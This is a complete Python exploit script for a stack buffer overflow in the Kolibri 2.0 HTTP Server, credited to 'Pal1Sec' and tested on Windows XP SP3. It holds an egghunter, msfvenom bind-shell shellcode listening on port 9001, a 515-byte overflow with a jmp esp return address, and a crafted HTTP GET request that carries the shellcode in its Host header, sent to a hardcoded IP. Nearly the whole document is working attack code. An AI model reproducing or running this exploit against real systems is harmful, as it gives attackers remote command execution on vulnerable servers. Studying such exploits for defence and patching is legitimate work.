# Exploit for Kolibri 2.0 HTTP Server - Stack Buffer Overflow
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python

import socket
import os
import sys

# Egghunter = "W00T", 32 bytes
# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0d\x0a\x3d\x20\x3f" -f python -v shellcode_bind

egghunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x57\x30"
"\x30\x54\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

shellcode_bind =  b""
shellcode_bind += b"\xbe\xa3\xa5\x29\xa1\xd9\xed\xd9\x74\x24"
shellcode_bind += b"\xf4\x5d\x31\xc9\xb1\x53\x31\x75\x12\x83"
shellcode_bind += b"\xc5\x04\x03\xd6\xab\xcb\x54\xe4\x5c\x89"
shellcode_bind += b"\x97\x14\x9d\xee\x1e\xf1\xac\x2e\x44\x72"
shellcode_bind += b"\x9e\x9e\x0e\xd6\x13\x54\x42\xc2\xa0\x18"
shellcode_bind += b"\x4b\xe5\x01\x96\xad\xc8\x92\x8b\x8e\x4b"
shellcode_bind += b"\x11\xd6\xc2\xab\x28\x19\x17\xaa\x6d\x44"
shellcode_bind += b"\xda\xfe\x26\x02\x49\xee\x43\x5e\x52\x85"
shellcode_bind += b"\x18\x4e\xd2\x7a\xe8\x71\xf3\x2d\x62\x28"
shellcode_bind += b"\xd3\xcc\xa7\x40\x5a\xd6\xa4\x6d\x14\x6d"
shellcode_bind += b"\x1e\x19\xa7\xa7\x6e\xe2\x04\x86\x5e\x11"
shellcode_bind += b"\x54\xcf\x59\xca\x23\x39\x9a\x77\x34\xfe"
shellcode_bind += b"\xe0\xa3\xb1\xe4\x43\x27\x61\xc0\x72\xe4"
shellcode_bind += b"\xf4\x83\x79\x41\x72\xcb\x9d\x54\x57\x60"
shellcode_bind += b"\x99\xdd\x56\xa6\x2b\xa5\x7c\x62\x77\x7d"
shellcode_bind += b"\x1c\x33\xdd\xd0\x21\x23\xbe\x8d\x87\x28"
shellcode_bind += b"\x53\xd9\xb5\x73\x3c\x2e\xf4\x8b\xbc\x38"
shellcode_bind += b"\x8f\xf8\x8e\xe7\x3b\x96\xa2\x60\xe2\x61"
shellcode_bind += b"\xc4\x5a\x52\xfd\x3b\x65\xa3\xd4\xff\x31"
shellcode_bind += b"\xf3\x4e\x29\x3a\x98\x8e\xd6\xef\x35\x86"
shellcode_bind += b"\x71\x40\x28\x6b\xc1\x30\xec\xc3\xaa\x5a"
shellcode_bind += b"\xe3\x3c\xca\x64\x29\x55\x63\x99\xd2\x7a"
shellcode_bind += b"\x5d\x14\x34\x16\x8d\x70\xee\x8e\x6f\xa7"
shellcode_bind += b"\x27\x29\x8f\x8d\x1f\xdd\xd8\xc7\x98\xe2"
shellcode_bind += b"\xd8\xcd\x8e\x74\x53\x02\x0b\x65\x64\x0f"
shellcode_bind += b"\x3b\xf2\xf3\xc5\xaa\xb1\x62\xd9\xe6\x21"
shellcode_bind += b"\x06\x48\x6d\xb1\x41\x71\x3a\xe6\x06\x47"
shellcode_bind += b"\x33\x62\xbb\xfe\xed\x90\x46\x66\xd5\x10"
shellcode_bind += b"\x9d\x5b\xd8\x99\x50\xe7\xfe\x89\xac\xe8"
shellcode_bind += b"\xba\xfd\x60\xbf\x14\xab\xc6\x69\xd7\x05"
shellcode_bind += b"\x91\xc6\xb1\xc1\x64\x25\x02\x97\x68\x60"
shellcode_bind += b"\xf4\x77\xd8\xdd\x41\x88\xd5\x89\x45\xf1"
shellcode_bind += b"\x0b\x2a\xa9\x28\x88\x4a\x48\xf8\xe5\xe2"
shellcode_bind += b"\xd5\x69\x44\x6f\xe6\x44\x8b\x96\x65\x6c"
shellcode_bind += b"\x74\x6d\x75\x05\x71\x29\x31\xf6\x0b\x22"
shellcode_bind += b"\xd4\xf8\xb8\x43\xfd"

crash = "A" * 515
crash+= "\xd7\x30\x9d\x7c" # 0x7c9d30d7 -> jmp esp -> SHELL32.dll
crash+= egghunter
crash+= "C" * (600-515-4-len(egghunter))

buffer = "GET /"
buffer+= crash
buffer+= "HTTP/1.1\r\n"
buffer+= "Host: " + "W00TW00T" + shellcode_bind + ":8080\r\n"
buffer+= "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
buffer+= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+=" Accept-Language: en-US,en;q=0.5\r\n"
buffer+= "Accept-Encoding: gzip, deflate\r\n"
buffer+= "Connection: keep-alive\r\n"
buffer+= "Upgrade-Insecure-Requests: 1\r\n\r\n"

print "[*] Sending evil HTTP request to Kolibri"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.35.132", 8080))
s.send(buffer)
s.close()
